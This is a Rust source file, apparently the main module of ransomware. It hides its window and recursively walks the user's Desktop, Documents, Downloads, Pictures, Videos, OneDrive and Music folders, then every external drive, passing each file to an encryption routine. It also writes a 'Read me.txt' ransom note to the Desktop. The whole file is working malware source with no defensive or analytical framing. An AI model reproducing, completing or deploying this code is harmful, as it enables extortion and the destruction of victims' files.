#![windows_subsystem = "windows"]
#![feature(option_result_contains)]

use std::{fs, path::Path};

mod constants;
use constants::*;

mod crypto;
mod note;

fn main() {
    let pathstring = format!(r#"C:\Users\{}"#, whoami::username());
    scan_files(&pathstring);

    let notestring = format!(r#"C:\Users\{}\Desktop\Read me.txt"#, whoami::username());
    note::init(NOTE, &notestring);

    for letter in EXTERNAL_DRIVE_LETTERS {
        scan_external_drives(&format!(r#"{}:\"#, letter));
    }
}

fn scan_files(pathstring: &String) {
    let path = Path::new(&pathstring);

    if path.exists() && !path.display().to_string().contains("desktop.ini") {
        let read_dir = fs::read_dir(path).unwrap();
        for entry in read_dir {
            println!("{}", entry.as_ref().unwrap().path().display());
            let path = entry.as_ref().unwrap().path();
            let display = entry.as_ref().unwrap().path().display().to_string();
            if path.is_dir()
                && (display.contains("AppData")
                    || display.contains("Desktop")
                    || display.contains("Downloads")
                    || display.contains("Documents")
                    || display.contains("Pictures")
                    || display.contains("Videos")
                    || display.contains("OneDrive")
                    || display.contains("Music"))
            {
                if !display.contains("AppData") && !path.is_symlink() {
                    scan_files(&display);
                } else {
                    scan_appdata(&display);
                }
            } else if path.is_file() {
                crypto::init(&path.display().to_string());
            }
        }
    }
}

fn scan_external_drives(dir: &String) {
    let pathstring = dir;
    let path = Path::new(&pathstring);

    if path.exists() {
        println!("{}", path.display());
        let read_dir = fs::read_dir(path).unwrap();
        for entry in read_dir {
            let path = entry.as_ref().unwrap().path();
            let display = entry.as_ref().unwrap().path().display().to_string();
            if path.is_dir() {
                scan_external_drives(&display);
            } else if path.is_file() {
                crypto::init(&path.display().to_string());
            }
        }
    }
}

fn scan_appdata(dir: &String) {
    println!("{}", dir)
}
